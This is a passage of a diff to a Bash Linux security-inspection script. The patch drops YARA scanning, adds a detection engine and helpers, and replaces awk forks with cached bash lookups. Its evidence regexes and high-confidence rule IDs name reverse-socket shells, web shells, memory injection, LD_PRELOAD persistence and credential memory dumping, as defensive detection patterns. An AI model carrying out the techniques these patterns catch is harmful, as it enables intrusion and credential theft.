@@ -58,6 +58,11 @@ NATIVE_SCANNER_STATUS="NOT_RUN"
 NATIVE_HASH_FILES_READY=false
 NATIVE_FILE_MONITOR_READY=false
 NATIVE_RUNTIME_READY=false
+NATIVE_PRIORITY_WALK_READY=false
+# 轮内共享缓存：包归属索引（runtime-snapshot 各阶段 + file-monitor 复用）与
+# 哈希索引（file-monitor 产出，避免重复哈希同一文件）。
+PACKAGE_INDEX_CACHE_FILE=""
+FILE_HASH_INDEX_FILE=""
 NATIVE_RUNTIME_TIMEOUT="${SECSCOPE_NATIVE_RUNTIME_TIMEOUT:-120}"
 NATIVE_RUNTIME_INITIAL_STATUS="NOT_RUN"
 NATIVE_RUNTIME_PERIODIC_STATUS="NOT_RUN"
@@ -65,7 +70,6 @@ NATIVE_RUNTIME_FINAL_STATUS="NOT_RUN"
 NATIVE_RUNTIME_LAST_STATUS="NOT_RUN"
 NATIVE_RUNTIME_LAST_SUMMARY=""
 PROFILE_STATIC_ANALYSIS=true
-PROFILE_YARA_ENABLED=true
 PROFILE_PACKAGE_INTEGRITY=false
 PROFILE_DEEP_FILESYSTEM=false
 AUTH_BEHAVIOR_ENABLED="${SECSCOPE_AUTH_BEHAVIOR_ENABLED:-true}"
@@ -73,19 +77,29 @@ AUTH_MAX_EVENTS="${SECSCOPE_AUTH_MAX_EVENTS:-200}"
 EVENT_WINDOW_MINUTES="${SECSCOPE_EVENT_WINDOW_MINUTES:-40}"
 FALCO_LOG_PATH="${SECSCOPE_FALCO_LOG:-}"
 AUDIT_LOG_PATH="${SECSCOPE_AUDIT_LOG:-/var/log/audit/audit.log}"
-YARA_RULES_PATH="${SECSCOPE_YARA_RULES:-${PROGRAM_DIR}/rules/yara-forge-core-20260809}"
-YARA_MODE_REQUESTED="${SECSCOPE_YARA_MODE:-auto}"
-YARA_MODE="auto"
-YARA_FILE_TIMEOUT="${SECSCOPE_YARA_FILE_TIMEOUT:-8}"
-YARA_TOTAL_TIMEOUT="${SECSCOPE_YARA_TOTAL_TIMEOUT:-120}"
-YARA_MAX_FILES="${SECSCOPE_YARA_MAX_FILES:-600}"
-YARA_MAX_RULE_SOURCES="${SECSCOPE_YARA_MAX_RULE_SOURCES:-64}"
-YARA_RULE_MAX_DEPTH="${SECSCOPE_YARA_RULE_MAX_DEPTH:-3}"
-YARA_PROMOTER_PATH="${PROGRAM_DIR}/helpers/yara_promoter.py"
+STATIC_TOTAL_TIMEOUT="${SECSCOPE_STATIC_TOTAL_TIMEOUT:-120}"
 STATIC_MAX_FILES="${SECSCOPE_STATIC_MAX_FILES:-1600}"
 STATIC_ROOT_QUOTA="${SECSCOPE_STATIC_ROOT_QUOTA:-240}"
 STATIC_ANALYZER_PATH="${PROGRAM_DIR}/helpers/static_analyzer.py"
 BINARY_ANALYZER_PATH="${PROGRAM_DIR}/helpers/binary_analyzer.py"
+# v2 统一检测引擎：加权家族签名（内容+二进制），替代 native analyze-static/analyze-binary 深度分析通道。
+DETECT_ENGINE_PATH="${PROGRAM_DIR}/helpers/detect_engine.py"
+DETECT_PACK_PATH="${PROGRAM_DIR}/rules/detect-pack.json"
+REPORT_GEN_PATH="${PROGRAM_DIR}/helpers/report_gen.py"
+# v2.2 批处理 helper：快照事件发布 + Web 日志关联/攻击者画像（消灭 bash fork 风暴）。
+SNAPSHOT_EVENTS_PATH="${PROGRAM_DIR}/helpers/snapshot_events.py"
+WEB_CORRELATE_PATH="${PROGRAM_DIR}/helpers/web_correlate.py"
+DELETED_FDS_PATH="${PROGRAM_DIR}/helpers/deleted_fds.py"
+SAMPLE_BAG_PATH="${PROGRAM_DIR}/helpers/sample_bag.py"
+IOC_EXPORT_PATH="${PROGRAM_DIR}/helpers/ioc_export.py"
+REPORT_COMPARE_PATH="${PROGRAM_DIR}/helpers/report_compare.py"
+DETECT_RULE_COUNT=$(grep -c '"id":' "${PROGRAM_DIR}/rules/detect-pack.json" 2>/dev/null || printf '?')
+# 全局扫描预算：默认 900 秒（15 分钟）。超时后剩余模块诚实标记 SKIPPED_BUDGET，
+# 报告按 PARTIAL 呈现，绝不把"没扫完"伪装成"没有威胁"。
+COMPARE_DIR="${SECSCOPE_COMPARE_DIR:-}"
+COMPARE_DATA_FILE=""
+SCAN_DEADLINE_SECONDS="${SECSCOPE_SCAN_DEADLINE_SECONDS:-900}"
+DEADLINE_RESERVE_SECONDS="${SECSCOPE_DEADLINE_RESERVE_SECONDS:-45}"
 STATIC_ROUTER_PATH="${PROGRAM_DIR}/helpers/route_static_candidates.py"
 RAT_ENGINE_PATH="${PROGRAM_DIR}/helpers/rat_engine.py"
 THREAT_INTEL_PATH="${PROGRAM_DIR}/helpers/threat_intel.py"
@@ -164,8 +178,10 @@ FILE_TIMEOUT_SECONDS=120
 FILE_RECENT_DAYS=7
 FILE_SMALL_PRIORITY_BYTES=204800
 FILE_SCAN_ROOTS="/tmp,/var/tmp,/dev/shm,/etc,/usr/local/bin,/usr/local/sbin,/opt,/srv/www,/var/www,/usr/share/nginx,/home,/root"
-FILE_EXTENSIONS="sh,bash,zsh,py,pl,rb,php,phtml,jsp,jspx,asp,aspx,js,jpg,jpeg,png,gif,jar,war,so,ko,elf,bin,run,service,timer,socket,path,mount,conf"
+FILE_EXTENSIONS="sh,bash,zsh,py,pl,rb,php,phtml,php5,php7,jsp,jspx,asp,aspx,js,mjs,cjs,json,txt,toml,ini,cfg,conf,c,cpp,h,go,ps1,yaml,yml,xml,sql,md,jpg,jpeg,png,gif,jar,war,so,ko,elf,bin,run,service,timer,socket,path,mount,conf,htaccess,cgi,rules,plist,desktop,lnk,vbs,bat,cmd"
 FILE_EXCLUDE_NAMES="node_modules,.git,.svn,__pycache__,overlay2,containers,cache"
+FILE_EXCLUDE_PREFIXES="${SECSCOPE_FILE_EXCLUDE_PREFIXES:-}"
+FILE_PRIORITY_JUST_DROPPED="${SECSCOPE_FILE_PRIORITY_JUST_DROPPED:-2000}"
 FILE_APPROVED_HASHES=""
 FILE_MALICIOUS_HASHES=""
 FILE_INVENTORY_FILE=""
@@ -215,21 +231,9 @@ EVENT_CACHE_STATE_FILE=""
 EVENT_SOURCE_FALCO="MISSING"
 EVENT_SOURCE_AUDITD="MISSING"
 EVENT_SOURCE_SNAPSHOT="AVAILABLE"
-EVENT_SOURCE_YARA="MISSING"
-YARA_SCANNER=""
-YARA_SCANNER_PATH=""
-YARA_SCANNER_VERSION=""
-YARA_CAPABILITY_ERROR=""
-YARA_SCANNED=0
-YARA_MATCHED=0
-YARA_TIMEOUT_COUNT=0
-YARA_ERROR_COUNT=0
-YARA_PROMOTED_FINDINGS=0
-YARA_RULES_LOADED=0
 STATIC_CANDIDATE_FILE=""
 STATIC_WEB_CANDIDATE_FILE=""
 STATIC_BINARY_CANDIDATE_FILE=""
-STATIC_YARA_CANDIDATE_FILE=""
 STATIC_COVERAGE_FILE=""
 STATIC_CANDIDATE_STATUS=NOT_RUN
 STATIC_PIPELINE_DEADLINE=0
@@ -303,8 +307,9 @@ declare -a FINDINGS=()
 declare -a FINDING_SEVS=() FINDING_CATS=() FINDING_SUMMARIES=() FINDING_EVIDENCES=() FINDING_RECOMMENDATIONS=() FINDING_MITRES=()
 declare -a FINDING_RULE_IDS=() FINDING_ENTITY_KEYS=() FINDING_FINGERPRINTS=() FINDING_EVIDENCE_HASHES=()
 declare -a FINDING_ENTITY_TYPES=()
-declare -a FINDING_EVIDENCE_PART_HASHES=()
-declare -a YARA_RULE_SOURCES=()
+declare -a FINDING_FP_KEYS=() FINDING_EVIDENCE_PART_KEYS=() FINDING_B64_SUMMARIES=() FINDING_B64_ENTITIES=()
+declare -A PROCESS_ROW_BY_PID=() UID_USER_CACHE=()
+PROCESS_ROW_LOADED=0; BOOT_ID_VALUE=""
 declare -a DISCOVERED_WEB_ROOTS=()
 declare -a FINDING_MODULES=() FINDING_LIFECYCLES=() FINDING_FIRST_SEEN=() FINDING_LAST_SEEN=() FINDING_OCCURRENCES=()
 declare -a FINDING_RAW_REFS=()
@@ -508,6 +513,13 @@ WHITELIST_PROCESS=(
     "rkhunter" "chkrootkit" "lynis" "nessus" "nessusd" "openvas" "gvmd"
     "ospd-openvas" "qualys" "qualys-cloud-agent"
 )
+# v2.2：构建期把白名单预降小写进关联数组（键=小写名）。
+declare -A WHITELIST_LOWER=()
+for _wl in "${WHITELIST_PROCESS[@]}"; do
+    WHITELIST_LOWER["${_wl,,}"]=1
+done
+unset _wl
+
 # 白名单路径 — 监控 Agent + 运维工具 + 运行时 + 构建工具 典型安装目录（前缀匹配）
 WHITELIST_PATHS=(
     # 阿里云
@@ -616,9 +628,9 @@ benchmark_stage_end() {
 
 benchmark_write_summary() {
     [ "$BENCHMARK_ENABLED" = 1 ] || return 0
-    printf '{"type":"summary","profile":"%s","files_traversed":%s,"stat_calls":%s,"hash_computed":%s,"hash_reused":%s,"hash_failed":%s,"yara_scanned":%s,"yara_rules":%s,"proc_pid_visits":%s,"proc_maps_visits":%s,"socket_snapshots":%s,"fallback_count":%s}\n' \
+    printf '{"type":"summary","profile":"%s","files_traversed":%s,"stat_calls":%s,"hash_computed":%s,"hash_reused":%s,"hash_failed":%s,"proc_pid_visits":%s,"proc_maps_visits":%s,"socket_snapshots":%s,"fallback_count":%s}\n' \
         "$SCAN_PROFILE" "$BENCHMARK_FILE_TRAVERSED" "$BENCHMARK_STAT_CALLS" "$FILE_SCAN_HASH_SUCCESS" "$FILE_SCAN_HASH_REUSED" "$FILE_SCAN_HASH_FAILED" \
-        "$YARA_SCANNED" "$YARA_RULES_LOADED" "$BENCHMARK_PROC_PID_VISITS" "$BENCHMARK_PROC_MAPS_VISITS" "$BENCHMARK_SOCKET_SNAPSHOTS" "$BENCHMARK_FALLBACK_COUNT" \
+        "$BENCHMARK_PROC_PID_VISITS" "$BENCHMARK_PROC_MAPS_VISITS" "$BENCHMARK_SOCKET_SNAPSHOTS" "$BENCHMARK_FALLBACK_COUNT" \
         >> "$BENCHMARK_METRICS_FILE"
 }
 
@@ -873,9 +885,9 @@ panel_init() {
     PANEL_SUMMARY_LIVE=true
     [ "$lines" -ge 28 ] || PANEL_SUMMARY_LIVE=false
     PANEL_STATE_FILE="${OUTPUT_DIR}/.panel.state"
-    printf '\n%b[INFO]%b inspection started: node=%s mode=%s profile=%s yara=%s\n' \
+    printf '\n%b[INFO]%b inspection started: node=%s mode=%s profile=%s\n' \
         "$GREEN" "$NC" "$(term_safe "$HOSTNAME")" "$([ "$SCHEDULED_RUN" = true ] && printf SCHEDULED || printf MANUAL)" \
-        "$(term_safe "$SCAN_PROFILE")" "$(term_safe "${YARA_MODE:-auto}")"
+        "$(term_safe "$SCAN_PROFILE")"
     panel_write_state
 }
 
@@ -961,37 +973,43 @@ progress_bar() {
     fi
 }
 
+# v2.2 快赢：去掉尾部 awk（fork），用 bash 参数展开截取哈希列。
+# 全脚本数百次调用点累计节省数千次 fork。
 sha256_text() {
+    local h
     if command -v sha256sum >/dev/null 2>&1; then
-        printf '%s' "$1" | sha256sum | awk '{print $1}'
+        h=$(printf '%s' "$1" | sha256sum)
     elif command -v shasum >/dev/null 2>&1; then
-        printf '%s' "$1" | shasum -a 256 | awk '{print $1}'
+        h=$(printf '%s' "$1" | shasum -a 256)
     else
-        printf '%s' "$1" | openssl dgst -sha256 2>/dev/null | awk '{print $NF}'
+        h=$(printf '%s' "$1" | openssl dgst -sha256 2>/dev/null)
     fi
+    printf '%s' "${h%%[[:space:]]*}"
 }
 
 sha256_file() {
+    local h
     if command -v sha256sum >/dev/null 2>&1; then
-        sha256sum -- "$1" | awk '{print $1}'
+        h=$(sha256sum -- "$1" 2>/dev/null)
     elif command -v shasum >/dev/null 2>&1; then
-        shasum -a 256 -- "$1" | awk '{print $1}'
+        h=$(shasum -a 256 -- "$1" 2>/dev/null)
     else
-        openssl dgst -sha256 -- "$1" 2>/dev/null | awk '{print $NF}'
+        h=$(openssl dgst -sha256 -- "$1" 2>/dev/null)
     fi
+    printf '%s' "${h%%[[:space:]]*}"
 }
 
 file_scan_cache_context() {
     local rules="${FILE_SCAN_RULE_FINGERPRINT:-${RULE_VERSION:-unknown}}"
-    printf 'schema=%s|analyzer=%s|rules=%s|profile=%s|yara_mode=%s|yara_scanner=%s|yara_version=%s|hash_bytes=%s|max_files=%s|max_depth=%s|timeout=%s|roots=%s|exclude=%s|extensions=%s|strategy=priority-v2-single-pass' \
+    printf 'schema=%s|analyzer=%s|rules=%s|profile=%s|hash_bytes=%s|max_files=%s|max_depth=%s|timeout=%s|roots=%s|exclude=%s|extensions=%s|excl_prefixes=%s|strategy=priority-v2-single-pass' \
         "$FILE_SCAN_CACHE_SCHEMA_VERSION" "$NATIVE_HASH_ANALYZER_VERSION" "$rules" \
-        "${SCAN_PROFILE:-unknown}" "${YARA_MODE:-unknown}" "${YARA_SCANNER:-none}" "${YARA_SCANNER_VERSION:-unknown}" \
+        "${STATE_PROFILE_KEY:-${SCAN_PROFILE:-unknown}}" \
         "$FILE_MAX_HASH_BYTES" "$FILE_MAX_FILES" "$FILE_MAX_DEPTH" "$FILE_TIMEOUT_SECONDS" \
-        "$FILE_SCAN_ROOTS" "$FILE_EXCLUDE_NAMES" "$FILE_EXTENSIONS"
+        "$FILE_SCAN_ROOTS" "$FILE_EXCLUDE_NAMES" "$FILE_EXTENSIONS" "$FILE_EXCLUDE_PREFIXES"
 }
 
 prepare_file_scan_cache_key() {
-    FILE_SCAN_RULE_FINGERPRINT=$(sha256_text "${RULE_VERSION:-unknown}|${YARA_RULES_PATH:-}|${YARA_RULE_MAX_DEPTH:-}|${YARA_MAX_RULE_SOURCES:-}|${YARA_RULES_LOADED:-0}")
+    FILE_SCAN_RULE_FINGERPRINT=$(sha256_text "${RULE_VERSION:-unknown}")
     FILE_SCAN_CACHE_KEY=$(sha256_text "$(file_scan_cache_context)")
 }
 
@@ -1002,7 +1020,7 @@ file_inventory_header_is_compatible() {
     [ "$magic" = "#secscope-file-inventory-v${FILE_SCAN_CACHE_SCHEMA_VERSION}" ] || return 1
     [ "$host" = "$HOST_ID" ] || return 1
     [ "$analyzer" = "$NATIVE_HASH_ANALYZER_VERSION" ] || return 1
-    [ "$profile" = "$SCAN_PROFILE" ] || return 1
+    [ "$profile" = "${STATE_PROFILE_KEY:-$SCAN_PROFILE}" ] || return 1
     [ "$max_bytes" = "$FILE_MAX_HASH_BYTES" ] || return 1
     [ "$rules" = "$FILE_SCAN_RULE_FINGERPRINT" ] || return 1
     [ "$key" = "$FILE_SCAN_CACHE_KEY" ]
@@ -1075,9 +1093,40 @@ evidence_identity_hash() {
     sha256_text "$canonical"
 }
 
+# 热路径辅助：TSV 取列 / boot_id 缓存 / process-context.tsv 按 pid 索引。
+# record_find→enrich_pid_evidence→process_display_for_pid 每轮调用上百次，
+# 旧实现每次调用都 fork awk/getent；这里全部改为纯 bash 查表。
+get_tsv_col() {
+    local row="$1" col="$2" i
+    for ((i = 1; i < col; i++)); do row="${row#*$'\t'}"; done
+    printf '%s' "${row%%$'\t'*}"
+}
+
+get_boot_id() {
+    if [ -z "$BOOT_ID_VALUE" ]; then
+        BOOT_ID_VALUE=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || true)
+        [ -n "$BOOT_ID_VALUE" ] || BOOT_ID_VALUE=unknown
+    fi
+    printf '%s' "$BOOT_ID_VALUE"
+}
+
+load_process_context_index() {
+    [ "$PROCESS_ROW_LOADED" = 1 ] && return 0
+    # 文件尚未生成时（users 模块先于 process 快照运行）不能置位，否则索引
+    # 会被永久锁空；此时保留重试，代价只是一次 [ -s ] 测试。
+    [ -s "${RAW_DIR:-/nonexistent}/process-context.tsv" ] || return 0
+    PROCESS_ROW_LOADED=1
+    local line rest pid
+    while IFS= read -r line; do
+        [ -n "$line" ] || continue
+        rest="${line#*$'\t'}"; rest="${rest#*$'\t'}"; pid="${rest%%$'\t'*}"
+        [[ "$pid" =~ ^[0-9]+$ ]] && PROCESS_ROW_BY_PID["$pid"]="$line"
+    done < "${RAW_DIR}/process-context.tsv"
+}
+
 stable_linux_entity() {
     local supplied="$1" evidence="$2" pid="" start="" exe="" boot="" normalized=""
-    boot=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || true)
+    boot=$(get_boot_id)
     if [[ "$supplied $evidence" =~ ([Pp][Ii][Dd][=:[:space:]]*)([0-9]+) ]]; then pid="${BASH_REMATCH[2]}"; fi
     if [ -n "$pid" ] && [ -r "/proc/${pid}/stat" ]; then
         start=$(awk '{print $22}' "/proc/${pid}/stat" 2>/dev/null)
@@ -1099,43 +1148,64 @@ stable_linux_entity() {
     esac
 }
 
+# v2.2 缓存：display 结果按 pid:starttime 记忆（starttime 键消除 PID 复用
+# 风险）。record_find 全轮数百次调用，每次省 3-6 次 fork。
+declare -A PROCESS_DISPLAY_CACHE=()
 process_display_for_pid() {
-    local pid="$1" current_start row instance ppid uid user exe package cmdline service boot
+    local pid="$1" current_start row instance ppid uid user exe package cmdline service
     [[ "$pid" =~ ^[0-9]+$ ]] || return 1
     current_start=$(awk '{print $22}' "/proc/${pid}/stat" 2>/dev/null) || return 1
-    if [ -r "${RAW_DIR:-/nonexistent}/process-context.tsv" ]; then
-        row=$(awk -F '\t' -v pid="$pid" -v start="$current_start" 'NR>1 && $3==pid && $4==start {print; exit}' "${RAW_DIR}/process-context.tsv" 2>/dev/null)
-    fi
-    if [ -n "$row" ]; then
-        instance=$(printf '%s\n' "$row" | awk -F '\t' '{print $1}')
-        ppid=$(printf '%s\n' "$row" | awk -F '\t' '{print $5}')
-        uid=$(printf '%s\n' "$row" | awk -F '\t' '{print $7}')
-        exe=$(printf '%s\n' "$row" | awk -F '\t' '{print $11}')
-        package=$(printf '%s\n' "$row" | awk -F '\t' '{print $12}')
-        cmdline=$(printf '%s\n' "$row" | awk -F '\t' '{print $18}')
+    local cache_key="${pid}:${current_start}"
+    local cached="${PROCESS_DISPLAY_CACHE[$cache_key]:-}"
+    [ -n "$cached" ] && { printf '%s' "$cached"; return 0; }
+    load_process_context_index
+    row="${PROCESS_ROW_BY_PID[$pid]:-}"
+    if [ -n "$row" ] && [ "$(get_tsv_col "$row" 4)" = "$current_start" ]; then
+        instance=$(get_tsv_col "$row" 1)
+        ppid=$(get_tsv_col "$row" 5)
+        uid=$(get_tsv_col "$row" 7)
+        exe=$(get_tsv_col "$row" 11)
+        package=$(get_tsv_col "$row" 12)
+        cmdline=$(get_tsv_col "$row" 18)
     else
-        boot=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || echo unknown)
-        instance="process:${boot}:${pid}:${current_start}"
+        instance="process:$(get_boot_id):${pid}:${current_start}"
         ppid=$(awk '/^PPid:/ {print $2; exit}' "/proc/${pid}/status" 2>/dev/null)
         uid=$(awk '/^Uid:/ {print $2; exit}' "/proc/${pid}/status" 2>/dev/null)
         exe=$(readlink "/proc/${pid}/exe" 2>/dev/null || echo unknown)
         cmdline=$(tr '\0\t\n' '   ' < "/proc/${pid}/cmdline" 2>/dev/null | head -c 800)
         package=$(file_package_owner "${exe% (deleted)}"); [ -n "$package" ] || package=unowned
     fi
-    user=$(getent passwd "$uid" 2>/dev/null | cut -d: -f1); [ -n "$user" ] || user="uid:${uid:-unknown}"
+    if [ -n "${UID_USER_CACHE[$uid]:-}" ]; then
+        user="${UID_USER_CACHE[$uid]}"
+    else
+        user=$(getent passwd "$uid" 2>/dev/null | cut -d: -f1); [ -n "$user" ] || user="uid:${uid:-unknown}"
+        [ -n "${uid:-}" ] && UID_USER_CACHE["$uid"]="$user"
+    fi
     service=$(sed -nE 's#.*[/]([^/]+[.]service)(/.*)?$#\1#p' "/proc/${pid}/cgroup" 2>/dev/null | head -1); [ -n "$service" ] || service=unassociated
     [ -n "$cmdline" ] || cmdline=unknown
-    printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' "$instance" "$pid" "${exe:-unknown}" "$user" "$cmdline" "${ppid:-unknown}" "$service" "${package:-unowned}"
+    local display
+    printf -v display '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s' "$instance" "$pid" "${exe:-unknown}" "$user" "$cmdline" "${ppid:-unknown}" "$service" "${package:-unowned}"
+    PROCESS_DISPLAY_CACHE["$cache_key"]="$display"
+    printf '%s\n' "$display"
 }
 
 enrich_pid_evidence() {
-    local evidence="$1" pid display additions="" count=0
-    while IFS= read -r pid; do
-        [ -n "$pid" ] || continue
+    local evidence="$1" pid display additions="" count=0 rest="$evidence" dup=false p
+    local re='([Pp][Ii][Dd][=:][[:space:]]*)([0-9]+)'
+    local -a seen_pids=()
+    while [[ "$rest" =~ $re ]]; do
+        pid="${BASH_REMATCH[2]}"
+        rest="${rest#*${BASH_REMATCH[0]}}"
+        dup=false
+        for p in "${seen_pids[@]}"; do
+            [ "$p" = "$pid" ] && { dup=true; break; }
+        done
+        $dup && continue
+        seen_pids+=("$pid")
         display=$(process_display_for_pid "$pid" 2>/dev/null) || continue
-        additions="${additions}${additions:+$'\n'}$(printf '%s' "$display" | awk -F '\t' '{printf "PID=%s; process_instance_id=%s; exe=%s; user=%s; cmdline=%s; ppid=%s; systemd_service=%s; package_owner=%s",$2,$1,$3,$4,$5,$6,$7,$8}')"
+        additions="${additions}${additions:+$'\n'}PID=${pid}; process_instance_id=$(get_tsv_col "$display" 1); exe=$(get_tsv_col "$display" 3); user=$(get_tsv_col "$display" 4); cmdline=$(get_tsv_col "$display" 5); ppid=$(get_tsv_col "$display" 6); systemd_service=$(get_tsv_col "$display" 7); package_owner=$(get_tsv_col "$display" 8)"
         count=$((count + 1)); [ "$count" -ge 8 ] && break
-    done < <(printf '%s\n' "$evidence" | grep -oiE 'pid[=:][[:space:]]*[0-9]+' | grep -oE '[0-9]+' | awk '!seen[$0]++')
+    done
     [ -z "$additions" ] && printf '%s' "$evidence" || printf '%s\n--- 进程上下文 ---\n%s' "$evidence" "$additions"
 }
 
@@ -1194,15 +1264,15 @@ infer_evidence_domains() {
     [[ "$evidence $refs" =~ [Cc]ron|systemd|authorized_keys|sudoers|PAM|LD_PRELOAD|持久化 ]] && domains="${domains}${domains:+,}PERSISTENCE"
     [[ "$evidence $refs" =~ [Ww]eb|HTTP|nginx|apache|php-fpm|tomcat|gunicorn|uwsgi|caddy|litespeed ]] && domains="${domains}${domains:+,}WEB"
     [[ "$evidence $refs" =~ memfd|rwxp|ptrace|process_vm_writev|/proc/[0-9]+/mem|maps ]] && domains="${domains}${domains:+,}MEMORY"
-    [[ "$evidence $refs" =~ package=|包归属|hash|哈希|IMA|YARA ]] && domains="${domains}${domains:+,}INTEGRITY"
-    [[ "$evidence $refs" =~ [Yy][Aa][Rr][Aa]|malware|恶意软件|Defender|恶意哈希 ]] && domains="${domains}${domains:+,}MALWARE_ENGINE"
+    [[ "$evidence $refs" =~ package=|包归属|hash|哈希|IMA ]] && domains="${domains}${domains:+,}INTEGRITY"
+    [[ "$evidence $refs" =~ malware|恶意软件|Defender|恶意哈希 ]] && domains="${domains}${domains:+,}MALWARE_ENGINE"
     [[ "$evidence $refs" =~ 清除日志|日志清理|绕过|防御规避|tamper|evasion ]] && domains="${domains}${domains:+,}DEFENSE_EVASION"
     normalize_evidence_domains "$domains"
 }
 
 is_direct_high_confidence_rule() {
     case "$1" in
-        REV-SOCKET-STDIO|FS-MALICIOUS-HASH|WEB-SHELL-NETWORK|AUTH-BRUTE-LOGIN-ACTION|MEM-INJECTION-CONFIRMED|LOG-SECURITY-CLEAR|YARA-MALICIOUS-HIT|YARA-MALICIOUS-HIT:*|CRD-MEMORY-DUMP-CORRELATED) return 0 ;;
+        REV-SOCKET-STDIO|FS-MALICIOUS-HASH|WEB-SHELL-NETWORK|AUTH-BRUTE-LOGIN-ACTION|MEM-INJECTION-CONFIRMED|LOG-SECURITY-CLEAR|CRD-MEMORY-DUMP-CORRELATED|FS-FAMILY-SIGNATURE) return 0 ;;
     esac
     return 1
 }
@@ -1290,14 +1360,25 @@ recalculate_severity_counts() {
 }
 
 # 记录一个发现 (severity: CRITICAL/HIGH/MEDIUM/LOW)
+# 性能契约：本函数每轮被调用 200+ 次，禁止在此逐条 fork sha256/sed/base64。
+# 指纹与证据哈希在轮末由 finalize_finding_hashes 一次性批量计算。
+# v2.2 索引：fp_input→FINDINGS 下标的关联数组，替代逐条线性扫描
+# （原 O(n²) 且每次对大 evidence 串做子串匹配）。键由 fp_input 计算，语义不变。
+declare -A FINDING_FP_INDEX=()
 record_find() {
     local sev="$1" category="$2" summary="$3" evidence="$4" recommendation="$5" mitre_id="$6"
-    local normalized rule_id entity_key fingerprint evidence_hash raw_refs idx finding_type confidence judgment_basis escalation_conditions
+    local normalized rule_id entity_key fp_input raw_refs idx finding_type confidence judgment_basis escalation_conditions
     local evidence_domains domain_count counter_evidence timeline requested_finding_type
     evidence=$(enrich_pid_evidence "$evidence")
     normalized=$(normalize_identity_text "$summary")
-    rule_id="${7:-$(auto_rule_id "$category" "$normalized")}" 
+    rule_id="${7:-}"
     entity_key=$(stable_linux_entity "${8:-$normalized}" "$evidence")
+    if [ -n "$rule_id" ]; then
+        fp_input="R|${rule_id}|${entity_key}"
+    else
+        fp_input="A|${category}|${normalized}|${entity_key}"
+    fi
+
     raw_refs="${9:-}"
     finding_type="${10:-$(default_finding_type "$sev" "$category")}"
     requested_finding_type="$finding_type"
@@ -1314,44 +1395,41 @@ record_find() {
     if [ "$THREAT_GATE_REASON" = "downgraded_insufficient_independent_domains" ]; then
         judgment_basis="${judgment_basis}；威胁门禁因仅有 ${domain_count} 个独立证据域而降级为待研判异常。"
     fi
-    fingerprint=$(sha256_text "${rule_id}|${entity_key}")
-    evidence_hash=$(evidence_identity_hash "$evidence")
 
     # 同一轮内相同实体只保留一条 Finding，并合并来源和证据。
-    for idx in "${!FINDINGS[@]}"; do
-        if [ "${FINDING_FINGERPRINTS[$idx]}" = "$fingerprint" ]; then
-            if [ "$(severity_rank "$sev")" -gt "$(severity_rank "${FINDING_SEVS[$idx]}")" ]; then
-                FINDING_SEVS[$idx]="$sev"
-            fi
-            if [[ ",${FINDING_EVIDENCE_PART_HASHES[$idx]}," != *",${evidence_hash},"* ]]; then
-                FINDING_EVIDENCES[$idx]="${FINDING_EVIDENCES[$idx]}"$'\n--- '"${CURRENT_MODULE}"$' ---\n'"${evidence}"
-                FINDING_EVIDENCE_HASHES[$idx]=$(evidence_identity_hash "${FINDING_EVIDENCES[$idx]}")
-                FINDING_EVIDENCE_PART_HASHES[$idx]="${FINDING_EVIDENCE_PART_HASHES[$idx]},${evidence_hash}"
-            fi
-            case ",${FINDING_MODULES[$idx]}," in
-                *,"$CURRENT_MODULE",*) ;;
-                *) FINDING_MODULES[$idx]="${FINDING_MODULES[$idx]},${CURRENT_MODULE}" ;;
-            esac
-            if [ -n "$raw_refs" ]; then
-                case ",${FINDING_RAW_REFS[$idx]}," in
-                    *,"$raw_refs",*) ;;
-                    *) FINDING_RAW_REFS[$idx]="${FINDING_RAW_REFS[$idx]}${FINDING_RAW_REFS[$idx]:+,}${raw_refs}" ;;
-                esac
-            fi
-            FINDING_TYPES[$idx]="$finding_type"
-            FINDING_CONFIDENCES[$idx]="$confidence"
-            FINDING_JUDGMENT_BASES[$idx]="$judgment_basis"
-            FINDING_ESCALATION_CONDITIONS[$idx]="$escalation_conditions"
-            FINDING_EVIDENCE_DOMAINS[$idx]=$(normalize_evidence_domains "${FINDING_EVIDENCE_DOMAINS[$idx]},${evidence_domains}")
-            FINDING_DOMAIN_COUNTS[$idx]=$(evidence_domain_count "${FINDING_EVIDENCE_DOMAINS[$idx]}")
-            FINDING_COUNTER_EVIDENCE[$idx]="$counter_evidence"
-            FINDING_TIMELINES[$idx]="${FINDING_TIMELINES[$idx]}${FINDING_TIMELINES[$idx]:+$'\n'}${timeline}"
-            [ "${FINDING_TYPES[$idx]}" = "SECURITY_THREAT" ] && requested_finding_type="SECURITY_THREAT"
-            apply_threat_gate "$requested_finding_type" "$rule_id" "$confidence" "${FINDING_EVIDENCE_DOMAINS[$idx]}"
-            FINDING_TYPES[$idx]="$THREAT_GATE_TYPE"; FINDING_CONFIDENCES[$idx]="$THREAT_GATE_CONFIDENCE"
-            return 0
+    idx="${FINDING_FP_INDEX[$fp_input]:-}"
+    # v2.2：O(1) 关联数组查找替代 O(n) 线性扫描（同语义：指纹相同即合并）。
+    if [ -n "$idx" ] && [ "${FINDING_FP_KEYS[$idx]:-}" = "$fp_input" ]; then
+        if [ "$(severity_rank "$sev")" -gt "$(severity_rank "${FINDING_SEVS[$idx]}")" ]; then
+            FINDING_SEVS[$idx]="$sev"
         fi
-    done
+        if [[ "${FINDING_EVIDENCE_PART_KEYS[$idx]}" != *$'\x1f'"${evidence}"$'\x1f'* ]]; then
+            FINDING_EVIDENCES[$idx]="${FINDING_EVIDENCES[$idx]}"$'\n--- '"${CURRENT_MODULE}"$' ---\n'"${evidence}"
+            FINDING_EVIDENCE_PART_KEYS[$idx]="${FINDING_EVIDENCE_PART_KEYS[$idx]}${evidence}"$'\x1f'
+        fi
+        case ",${FINDING_MODULES[$idx]}," in
+            *,"$CURRENT_MODULE",*) ;;
+            *) FINDING_MODULES[$idx]="${FINDING_MODULES[$idx]},${CURRENT_MODULE}" ;;
+        esac
+        if [ -n "$raw_refs" ]; then
+            case ",${FINDING_RAW_REFS[$idx]}," in
+                *,"$raw_refs",*) ;;
+                *) FINDING_RAW_REFS[$idx]="${FINDING_RAW_REFS[$idx]}${FINDING_RAW_REFS[$idx]:+,}${raw_refs}" ;;
+            esac
+        fi
+        FINDING_TYPES[$idx]="$finding_type"
+        FINDING_CONFIDENCES[$idx]="$confidence"
+        FINDING_JUDGMENT_BASES[$idx]="$judgment_basis"
